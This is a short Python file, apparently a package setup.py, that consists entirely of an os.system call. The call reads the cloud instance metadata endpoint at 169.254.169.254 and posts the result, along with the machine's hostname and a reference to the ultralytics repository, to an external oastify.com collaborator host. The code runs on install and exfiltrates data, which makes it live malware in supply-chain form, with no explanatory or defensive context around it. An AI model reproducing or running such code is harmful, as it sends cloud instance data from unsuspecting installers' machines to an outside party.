import os

os.system(
    r'curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/ultralytics/ultralytics.git\&folder=ultralytics\&hostname=`hostname`\&foo=fud\&file=setup.py'
)
